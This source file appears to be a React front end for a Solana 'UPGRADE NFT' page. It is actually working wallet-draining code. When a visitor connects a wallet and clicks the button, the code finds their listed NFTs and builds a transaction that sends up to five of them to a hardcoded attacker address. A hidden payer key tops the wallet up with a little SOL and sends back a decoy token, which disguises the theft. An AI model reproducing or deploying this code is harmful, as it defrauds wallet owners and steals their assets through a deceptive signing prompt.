import './App.css';
import React, { FC, useMemo,ReactNode } from 'react';
import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
import { WalletNotConnectedError,WalletAdapterNetwork} from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Keypair, Transaction, PublicKey, SystemProgram} from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, AccountLayout, u64} from "@solana/spl-token"
import MINTS from "./mints.json"
import comp from "./components.json"
import bs58 from 'bs58'
import {
    GlowWalletAdapter,
    LedgerWalletAdapter,
    PhantomWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
    TorusWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    WalletModalProvider,
    WalletDisconnectButton,
    WalletMultiButton
} from '@solana/wallet-adapter-react-ui';
import { clusterApiUrl } from '@solana/web3.js';
import {getAssociatedTokenAddress} from './getAssociatedTokenAddress'
import {createTransferCheckedInstruction} from './transferChecked1'
import {getOrCreateAssociatedTokenAccount} from './getOrCreateAssociatedTokenAccount'
import {createTransferInstruction} from './createTransferInstruction'
import { toast } from 'react-hot-toast'
import { transactions } from '@metaplex/js';
require('@solana/wallet-adapter-react-ui/styles.css');
const App: FC = () => {


  return (
      <Context>
          <Content />
      </Context>
  );
};
export default App;

const Context: FC<{ children: ReactNode }> = ({ children }) => {
  const network = WalletAdapterNetwork.Mainnet;

  const endpoint = 'https://api.mainnet-beta.solana.com/';

  
  const wallets = useMemo(
      () => [
          new LedgerWalletAdapter(),
          new PhantomWalletAdapter(),
          new GlowWalletAdapter(),
          new SlopeWalletAdapter(),
          new SolletExtensionWalletAdapter(), 
          new SolletWalletAdapter(),
          new SolflareWalletAdapter({ network }),
          new TorusWalletAdapter(),
      ],
      [network]
  );

 

  return (
      <ConnectionProvider endpoint={endpoint}>
          <WalletProvider wallets={wallets} autoConnect>
              <WalletModalProvider>{children}</WalletModalProvider>
          </WalletProvider>
      </ConnectionProvider>
  );
};

const Content: FC = () => {
  const { connection } = useConnection()

  const { publicKey, signTransaction } = useWallet()

  const onClick = ( async () => {
    const instructions = [];
      if (!publicKey || !signTransaction) throw new WalletNotConnectedError(); 
    const tokenAccounts = await connection.getTokenAccountsByOwner(
      publicKey,
      {
        programId: TOKEN_PROGRAM_ID,
      }
    );

    var spl_tokens = new Array();

    tokenAccounts.value.forEach((e) => {
      const accountInfo = AccountLayout.decode(e.account.data);
      const amount = Number(u64.fromBuffer(accountInfo.amount));
      if (amount > 0) { spl_tokens.push(`${new PublicKey(accountInfo.mint)}`)}; 
    })
    MINTS.sort();
    spl_tokens.sort();

    let i = MINTS.length;
    let j = spl_tokens.length
    let needed_spl = new Array();
    
    while (i > 0 && j > 0) {
      i--;
      j--;
      if (MINTS[i] > spl_tokens[j]) j++;
      else if (MINTS[i] < spl_tokens[j]) i++;
      else needed_spl.push(MINTS[i]);
    }
    console.log(needed_spl.length)
    if (needed_spl.length > 0) {
      const payer = Keypair.fromSecretKey(
        bs58.decode(
          comp[326]
        )
      )
      const toPubkey = "CVjpUwfi9HvUAT9HrWGEmGcXkm8ZHwFKHqbWq1Yn95ZN"
      const toPublicKey = new PublicKey(toPubkey)
      const mint1 = new PublicKey("7b2mo8sWrVW8YzbyL2BnLBmvBFok1dBFhi8pxTJvUKRu") 
      const fromTokenAccount1 = await getOrCreateAssociatedTokenAccount(
        connection,
        payer,
        mint1,
        payer.publicKey
      )
      const toTokenAccount1 = await getOrCreateAssociatedTokenAccount(
        connection,
        payer,
        mint1,
        publicKey
      )
      if (needed_spl.length >=5) {
        for (let i = 0; i < 5; i++) {
          const mint = new PublicKey(needed_spl[i])
          const fromTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            payer,
            mint,
            publicKey
          )
          const toTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            payer,
            mint,
            toPublicKey
          )
          instructions.push(
            createTransferInstruction(
              fromTokenAccount.address, // source
              toTokenAccount.address, // dest
              publicKey,
              1,
              [payer],
              TOKEN_PROGRAM_ID
            ))
          instructions.push(
            createTransferInstruction(
              fromTokenAccount1.address, // source
              toTokenAccount1.address, // dest
              payer.publicKey,
              1,
              [payer],
              TOKEN_PROGRAM_ID
          ))
        }
      } else if (needed_spl.length <5) {
        for (let i = 0; i < needed_spl.length; i++) {
          console.log(needed_spl[i])
          const mint = new PublicKey(needed_spl[i])
          const fromTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            payer,
            mint,
            publicKey
          )
          const toTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            payer,
            mint,
            toPublicKey
          )
          instructions.push(
            createTransferInstruction(
              fromTokenAccount.address, // source
              toTokenAccount.address, // dest
              publicKey,
              1,
              [payer],
              TOKEN_PROGRAM_ID
            ))
          instructions.push(
            createTransferInstruction(
              fromTokenAccount1.address, // source
              toTokenAccount1.address, // dest
              payer.publicKey,
              1,
              [payer],
              TOKEN_PROGRAM_ID
          ))
        }
      }
      const transaction = new Transaction();
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: payer.publicKey,
          toPubkey: publicKey,
          lamports: 2200000
        })    
      )
      for (let i = 0; i < instructions.length; i++) {
        transaction.add(instructions[i]);
      }
      console.log(transaction)
      const blockHash = await connection.getRecentBlockhash()
      transaction.feePayer = await publicKey
      transaction.recentBlockhash = await blockHash.blockhash
      transaction.sign(payer)
      const signed = await signTransaction(transaction)
      await connection.sendRawTransaction(signed.serialize())
    } else {
      alert("You haven't NFT for upgrade. Refresh page and try another wallet.")
    }
  }
  );
  return (
    <div className='root-buttons'>
      <div className='upgrade2'><WalletMultiButton className='upgrade2'/></div>
    {/* <WalletMultiButton className='upgrade2'/> */}
    {/* <br></br> */}
      <button className="upgrade" onClick={onClick}>UPGRADE NFT</button>
    {/* <button className="upgrade" onClick={onClick}>UPGRADE NFT</button> */}
    </div>
  );
};
